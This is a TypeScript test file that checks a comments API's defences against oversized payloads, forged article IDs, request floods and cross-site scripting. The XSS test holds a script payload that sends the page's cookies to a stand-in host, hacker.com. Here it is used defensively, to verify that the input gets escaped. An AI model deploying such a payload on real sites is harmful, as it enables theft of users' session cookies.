import { describe, it, expect, vi, beforeEach } from 'vitest';
import { Hono } from 'hono';
import publicCommentsRoutes from '../../src/routes/public-comments.routes';
import { NotificationService } from '../../src/services/notification.services';

describe('Comments API: Controller & Routes Security Tests', () => {
  let app: Hono<any>;
  let mockDb: any;

  beforeEach(() => {
    vi.clearAllMocks();
    vi.spyOn(NotificationService, 'publishEvent').mockResolvedValue(true as any);

    // Create a mock DB that tracks queries
    mockDb = {
      prepare: vi.fn().mockReturnThis(),
      bind: vi.fn().mockReturnThis(),
      first: vi.fn(),
      run: vi.fn(),
      all: vi.fn()
    };

    // Initialize Hono app for testing
    app = new Hono();
    
    // Create a mock KV that tracks queries
    const mockKv = {
      get: vi.fn().mockResolvedValue(null),
      put: vi.fn().mockResolvedValue(undefined),
      delete: vi.fn().mockResolvedValue(undefined)
    };

    // Inject mock DB and KV into context
    app.use('*', async (c, next) => {
      c.env = { DB: mockDb, K1: mockKv, ENVIRONMENT: 'development' };
      await next();
    });

    // Mount the comments route
    app.route('/public-comments', publicCommentsRoutes);
  });

  it('should block massive payload attacks (DoS Buffer Overflow Simulation)', async () => {
    const massiveContent = 'A'.repeat(100000); // 100,000 characters
    const req = new Request('http://localhost/public-comments', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        article_id: '123',
        user_name: 'Attacker',
        user_email: 'attacker@example.com',
        content: massiveContent
      })
    });

    const res = await app.request(req);
    
    // Zod Validator should block it with 400 Bad Request
    expect(res.status).toBe(400); 
    const data: any = await res.json();
    expect(data.slug).toBe('VALIDATION_ERROR');
    
    // CRITICAL: Ensure the Database was NEVER touched (Saves DB CPU/Memory)
    expect(mockDb.prepare).not.toHaveBeenCalled(); 
  });

  it('should prevent Blind Referential Attacks (Foreign Key Forgery)', async () => {
    // Attacker tries to attach a comment to an article that doesn't exist 
    // or one they don't have access to. The DB returns null.
    mockDb.first.mockResolvedValueOnce(null);

    const req = new Request('http://localhost/public-comments', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        article_id: 'fake_or_malicious_id',
        user_name: 'Attacker',
        user_email: 'attacker@example.com',
        content: 'This is spam'
      })
    });

    const res = await app.request(req);
    
    // System should safely reject it without throwing a raw SQL 500 error
    expect(res.status).toBe(404);
    const data: any = await res.json();
    expect(data.slug).toBe('NOT_FOUND');
    
    // Ensure the INSERT statement was completely blocked
    expect(mockDb.run).not.toHaveBeenCalled();
  });

  it('should handle Concurrent Flooding (Race Condition Simulation) without crashing', async () => {
    // Simulate DB responding properly
    mockDb.first.mockResolvedValue({ title: 'Test Article' }); 
    mockDb.run.mockResolvedValue({ success: true });

    // Attacker sends 50 requests at the EXACT same millisecond
    const promises = Array.from({ length: 50 }).map(() => {
      const req = new Request('http://localhost/public-comments', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          article_id: '123',
          user_name: 'BotNet',
          user_email: 'bot@example.com',
          content: 'Spam Flooding'
        })
      });
      return app.request(req);
    });

    const results = await Promise.all(promises);
    
    // Verify the Hono server processed all requests without node crashing
    const successCount = results.filter(r => r.status === 201).length;
    expect(successCount).toBe(50);
    expect(mockDb.run).toHaveBeenCalledTimes(50);
  });

  it('should neutralize Malicious XSS Payloads BEFORE Database execution', async () => {
    mockDb.first.mockResolvedValue({ title: 'Test Article' });

    // Attacker sends a highly malicious payload
    const maliciousPayload = '<script>fetch("http://hacker.com?cookie="+document.cookie)</script>';
    
    const req = new Request('http://localhost/public-comments', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        article_id: '123',
        user_name: 'NormalUser',
        user_email: 'user@example.com',
        content: maliciousPayload
      })
    });

    const res = await app.request(req);
    expect(res.status).toBe(201); // Request goes through, BUT payload must be disarmed

    // Inspect the exact query parameters sent to the SQLite driver
    const bindCalls = mockDb.bind.mock.calls;
    const insertBindCall = bindCalls[bindCalls.length - 1]; // The last bind is the INSERT
    
    const insertedContent = insertBindCall[5]; // Content is the 6th parameter
    
    // CRITICAL: Ensure the script tags are stripped/escaped in the DB level!
    expect(insertedContent).not.toContain('<script>');
    expect(insertedContent).toContain('&lt;script&gt;'); 
  });
});
